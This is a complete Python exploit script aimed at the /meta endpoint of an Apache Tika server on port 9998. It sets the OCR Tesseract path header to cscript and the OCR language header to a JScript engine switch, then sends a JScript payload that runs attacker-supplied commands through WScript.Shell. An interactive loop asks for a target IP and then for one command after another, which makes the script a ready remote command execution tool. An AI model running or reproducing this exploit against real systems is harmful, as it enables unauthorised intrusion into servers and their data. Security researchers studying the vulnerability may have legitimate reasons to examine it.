import requests


def loop():
    ip_address = input("enter the IP address of the tika server : ")
    while True:
        command = input("enter your command : ")
        exploit(command, ip_address)


def exploit(command, ip_address):
    host = ip_address
    port = 9998
    cmd = command

    url = host + ":" + str(port) + "/meta"

    headers = {"X-Tika-OCRTesseractPath": "\"cscript\"",
               "X-Tika-OCRLanguage": "//E:Jscript",
               "Expect": "100-continue",
               "Content-type": "image/jp2",
               "Connection": "close"}

    j_script = "var oShell = WScript.CreateObject('WScript.Shell');" \
               "var oExec = oShell.Exec('cmd /c {}');".format(cmd)

    try:
        requests.put("https://" + url, headers=headers, data=j_script, verify=False)

    except Exception:
        try:
            requests.put("http://" + url, headers=headers, data=j_script)
        except Exception:
            print("Something went wrong.")


def main():
    loop()


main()
